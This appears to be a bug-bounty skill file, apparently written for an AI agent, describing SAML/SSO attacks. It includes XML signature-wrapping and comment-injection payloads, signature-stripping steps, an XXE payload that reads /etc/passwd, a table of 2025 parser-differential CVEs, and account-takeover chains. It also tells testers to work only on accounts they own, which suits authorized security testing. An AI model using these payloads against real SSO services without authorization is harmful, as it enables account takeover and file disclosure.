---
name: hunt-saml
description: "Hunt SAML / SSO attacks. Patterns: XML Signature Wrapping (XSW) — modify Assertion while keeping Signature valid by relocating signed element, comment injection in NameID (admin@target.example<!--evil-->@attacker.example → some parsers see admin@target.example), signature stripping (remove Signature element entirely, server should reject but doesn't), key confusion (signed by attacker's IdP, accepted by SP), audience-restriction not validated, replay attack (same Assertion accepted twice within validity window). Also the 2025 parser-differential XSW family (ruby-saml, xml-crypto, samlify, node-saml, GitHub Enterprise Server). Tools: SAML Raider Burp extension, manual XML manipulation. Detection: any /saml endpoint, /Shibboleth.sso, /sso/saml/, Microsoft ADFS endpoints. Validate: account takeover via altered NameID, admin role injection via altered AttributeStatement. Use when hunting SSO flows, when SAML AssertionConsumerService is reachable, when chaining IdP-trust to SP-impersonation."
metadata:
  sources: cve_database, oasis_saml_spec, academic_research, public_research
  report_count: 6
---

## SAML / SSO ATTACKS
> SSO bugs frequently pay High–Critical. XML parsers are notoriously inconsistent.

### Attack Surface
```bash
# Find SAML endpoints
cat recon/$TARGET/urls.txt | grep -iE "saml|sso|login.*redirect|oauth|idp|sp"
# Key endpoints: /saml/acs (assertion consumer service), /sso/saml, /auth/saml/callback
```

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- BEFORE: valid assertion by user@company.com -->
<saml:Response>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid, covers ID=legit --></ds:Signature>
  </saml:Assertion>
</saml:Response>

<!-- AFTER: inject evil assertion. Signature still validates (covers #legit).
     App processes the FIRST assertion found = evil. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>  <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">
    <NameID>user@company.com</NameID>
    <ds:Signature><!-- Valid --></ds:Signature>
  </saml:Assertion>
</saml:Response>
```
Historical XSW reference: CVE-2016-5697 (ruby-saml < 1.3.0, signature wrapping).

### Attack 2: Comment Injection in NameID
```xml
<!-- Attacker registers/controls account: admin@company.com.evil.example -->
<NameID>admin@company.com<!---->.evil.example</NameID>
<!-- Signed canonical form (C14N without-comments strips the comment BEFORE
     digest): "admin@company.com.evil.example" — the value the signature covers. -->
<!-- App's XML processor also strips the comment but only reads the text node
     UP TO the comment boundary: "admin@company.com" — a DIFFERENT effective
     identity than was signed. The discrepancy is the bug. -->
<!-- Works when signer's C14N and app's text extraction disagree on comments.
     Duo Labs 2018 disclosure (CERT VU#475445): CVE-2017-11427 (python-saml),
     CVE-2017-11428 (ruby-saml), CVE-2017-11429 (saml2-js), CVE-2017-11430
     (OmniAuth-SAML), CVE-2018-0489 (Shibboleth XMLTooling-C), CVE-2018-7340
     (Duo Network Gateway). -->
```

### Attack 3: Signature Stripping
```
1. Decode SAMLResponse: echo "BASE64" | base64 -d | xmllint --format - > saml.xml
2. Delete the entire <Signature> element
3. Change NameID to admin@company.com
4. Re-encode: base64 -w0 saml.xml  (POST binding = raw base64, NO compression; Redirect binding uses raw DEFLATE — not gzip)
5. Submit — if server doesn't verify signature presence = admin ATO
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Assertion>
  <NameID>&xxe;</NameID>
</saml:Assertion>
```

### Attack 5: NameID Manipulation
```
Test these NameID values:
- admin@company.com (generic admin)
- administrator@company.com
- support@target.example
- Any email found in disclosed reports for this program
- ${7*7} (SSTI if NameID gets rendered in a template)
```

### Attack 6: 2025 Parser-Differential / XSW Family
Same root cause as XSW, new location: the code that **verifies** the signature and the code that **reads** the identity resolve different nodes (two XML parsers, a copied document, or a node the verifier skips). Test this whenever the SP runs one of the libraries below at a vulnerable version.

| CVE | Library / product | Fixed in | Differential | Test assertion shape |
|---|---|---|---|---|
| CVE-2025-25291 | ruby-saml | 1.12.4, 1.18.0 | DOCTYPE handling differs between REXML (signature check) and Nokogiri (data read) | signed response that also carries a DOCTYPE declaration |
| CVE-2025-25292 | ruby-saml | 1.12.4, 1.18.0 | namespace handling differs between REXML and Nokogiri | signed response with redeclared / conflicting namespace prefixes |
| CVE-2025-29774 | xml-crypto (Node) | 6.0.1, 3.2.1, 2.1.6 | more than one `SignedInfo` accepted inside one `Signature` | `Signature` containing a second `SignedInfo` |
| CVE-2025-29775 | xml-crypto (Node) | 6.0.1, 3.2.1, 2.1.6 | XML comment inside `DigestValue` accepted | `DigestValue` with an embedded comment |
| CVE-2025-47949 | samlify | 2.10.0 | signature wrapping (advisory); a second, unsigned `Assertion` beside the signed one per Endor Labs' writeup | two sibling assertions, only one signed |
| CVE-2025-54419 | @node-saml/node-saml | 5.1.0 | assertion read from the unsigned original document, not the verified one; passport-saml <= 3.2.4 listed unpatched | signed assertion whose `NameID` you edit after signing (advisory example: drop one character of the username) |
| CVE-2025-23369 | GitHub Enterprise Server (libxml2) | 3.12.14, 3.13.10, 3.14.7, 3.15.2 | libxml2 XPath value hash skips entity-reference nodes, so the ID lookup on a copied document returns a different `Assertion`; attacker needs an existing account | entity reference inside the referenced `ID` value |

Sources: [GitHub blog, ruby-saml parser differentials](https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/) (GHSA-4vc4-m8qh-g8jm, GHSA-754f-8gm6-c4r2), [GHSA-9p8x-f768-wp2g](https://github.com/advisories/GHSA-9p8x-f768-wp2g), [GHSA-x3m8-899r-f7c3](https://github.com/advisories/GHSA-x3m8-899r-f7c3), [GHSA-r683-v43c-6xqv](https://github.com/advisories/GHSA-r683-v43c-6xqv), [GHSA-4mxg-3p6v-xgq3](https://github.com/advisories/GHSA-4mxg-3p6v-xgq3), [hakivvi, libxml2 quirks on GHES](https://repzret.blogspot.com/2025/02/abusing-libxml2-quirks-to-bypass-saml.html).

**Detection methodology:**
1. **Fingerprint the SP library before sending anything odd.** Rails / OmniAuth stack → ruby-saml; Node/Express with Passport → node-saml + xml-crypto; samlify appears in Node SPs that do not use Passport; GHES is identified by the product itself. Confirm with leaked manifests (`Gemfile.lock`, `package.json`, `package-lock.json` via `hunt-source-leak`) or a version banner. Error text from a malformed `SAMLResponse` helps, but compare it with the library's own source on GitHub before naming the library in a report.
2. **Baseline your own assertion.** Capture a valid `SAMLResponse` for your own test account and confirm that a response with a broken signature is rejected. If it is accepted, this is Attack 3 (signature not enforced), not a parser differential.
3. **One shape at a time.** In SAML Raider, apply only the shape from the matching row and change the identity to a **second test account you own** (account B). Never target a real user's NameID.
4. **Read the decision, not the status.** The finding is the SP issuing a session for account B from a response signed for account A. A 200 on `/saml/acs` with an error page, or a login as account A, is a negative.
5. **Version-only findings are not exploits.** A vulnerable version without a working differential is an outdated-dependency note; the auth-decision change is what makes it Critical.

### Tools
```bash
# SAMLRaider (Burp extension) — automated XSW testing
# BApp Store → SAMLRaider → intercept SAMLResponse → SAML Raider tab
# Source: https://github.com/CompassSecurity/SAMLRaider

# Manual workflow:
echo "BASE64_SAML" | base64 -d > saml.xml
# Edit saml.xml
base64 -w0 saml.xml  # Re-encode
# URL-encode the result before sending as SAMLResponse parameter
```

### SAML Triage
```
XSW successful   = Critical (ATO any user)
Parser differential (Attack 6) proven on own accounts A→B = Critical
Sig stripping    = Critical (ATO any user)
Comment injection = High (ATO admin)
XXE in assertion = High (file read / SSRF)
NameID manip     = Medium/High (depends on what NameID maps to)
```

---

## Related Skills & Chains

- **`hunt-ato`** — SAML XSW with absent audience-restriction validation is the canonical SP-impersonation-of-admin chain. Chain primitive: XSW1 attack relocates signed assertion to a secondary position + injects evil assertion with `NameID=admin@target.example` in primary position + SP processes first assertion (the evil one) + SP doesn't validate `<AudienceRestriction>` so an assertion intended for IdP-A is accepted by SP-B → admin ATO across federated tenant boundary.
- **`hunt-auth-bypass`** — SAML signature-stripping is the textbook auth-bypass pattern; this skill provides the SAML mechanics, hunt-auth-bypass provides the broader bypass-discipline. Chain primitive: capture valid SAMLResponse → regex-strip `<ds:Signature>` element entirely → modify `<NameID>` to admin → re-encode base64 → POST to `/saml/acs` → SP wantAssertionsSigned=false silently accepts → admin session issued without any cryptographic challenge.
- **`hunt-oauth`** — SAML-fronted OAuth issuers turn assertion-level bugs into token-level ATO. Chain primitive: SP issues OAuth bearer tokens after SAML assertion validation + XSW alters NameID to admin → SP's token endpoint issues OAuth token bearing admin claims → all downstream OAuth-scoped APIs (admin API, billing API, user-management API) grant admin access from a single forged assertion.
- **`hunt-xxe`** — SAML assertions ARE XML; XXE in the assertion parser is a separate chain on top of XSW. Chain primitive: SAML parser without `disallow-doctype-decl` + `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` in assertion + `<NameID>&xxe;</NameID>` → SP renders/logs NameID → /etc/passwd contents leak in error response or audit log → file-read primitive on SAML SP infrastructure.
- **`security-arsenal`** — Pull the SAML/XSW Payload Catalog (XSW1-XSW8 templates, comment-injection variants for libxml/Xerces/MSXML parser differences, signature-wrapping with multiple Reference elements, key-confusion payloads where attacker-IdP-signed assertions are accepted by trust-naive SPs) and the always-rejected list for "SAMLResponse accepted on the wrong endpoint" claims that don't actually validate.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on a SAML "vulnerability" that only modifies non-security-relevant attributes (display name, locale) without altering NameID, AuthnContext, or role-bearing AttributeStatements. Theoretical XML manipulation that doesn't cross an authorization boundary is Informational, not Critical — the auth-decision-changing step is the gate.
